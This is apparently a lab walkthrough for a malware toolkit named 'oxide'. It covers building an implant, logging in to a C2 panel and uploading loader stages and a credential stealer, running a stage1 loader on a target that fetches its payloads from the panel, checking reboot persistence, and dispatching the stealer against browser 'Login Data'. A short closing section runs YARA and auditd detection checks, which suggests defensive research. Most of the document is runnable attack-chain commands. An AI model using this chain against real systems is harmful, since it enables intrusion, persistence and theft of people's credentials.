# Attack Chain Walkthrough

End-to-end execution in the lab environment.

## Prerequisites

- Panel at 10.10.100.1:8080 (admin/oxide)
- All binaries built: oxide-implant, stage1/2/3, oxide-stealer
- VMs: Ubuntu targets at 10.10.100.11, 10.10.100.12

## 1. Register stage binaries

```bash
cd ~/prj/oxide-loader
python3 builder.py \
  --implant ../oxide/target/debug/oxide-implant \
  --psk oxide-lab-psk --salt $(cat ../oxide/certs/salt.hex) \
  --out-rs stage3/src/payload.rs --rebuild

PANEL=http://10.10.100.1:8080
curl -c s.cookie -X POST $PANEL/api/auth/login \
  -H "Content-Type: application/json" -d '{"username":"admin","password":"oxide"}'

for N in 1 2 3; do
  bin=$([ $N -eq 1 ] && echo stage1/build/stage1 || echo stage${N}/target/release/stage${N})
  curl -b s.cookie -F "stage_number=${N}" -F "name=stage${N}" \
    -F "file=@${bin}" $PANEL/api/staging/upload
done

curl -b s.cookie -F "name=stealer" \
  -F "file=@../oxide-stealer/target/release/oxide-stealer" \
  $PANEL/api/staging/upload
```

## 2. Execute loader chain on target

```bash
# On Ubuntu target (10.10.100.11):
STAGE_URL=http://10.10.100.1:8080 ./stage1
```

Panel shows `BOT_CONNECTED`. Bot appears in the dashboard.

## 3. Verify persistence

Send `persist_status` from the panel. Reboot target VM. Implant reconnects within 60s.

## 4. Run steal

1. Click **Steal** in the bot detail view.
2. Panel dispatches `steal` with stealer UUID + SHA-256.
3. Implant downloads, validates, executes stealer subprocess.
4. Click **Credentials** tab — results appear.

## 5. Validate detection rules

```bash
# YARA against implant process
yara detection/yara/oxide_implant.yar /proc/$(pgrep oxide-implant)/exe
# Expected: oxide_implant_elf MATCH

# auditd for staging fetch
ausearch -k oxide 2>/dev/null | grep ".local/share/oxide"

# auditd for browser DB access
ausearch -k cred-access 2>/dev/null | grep "Login Data"
```
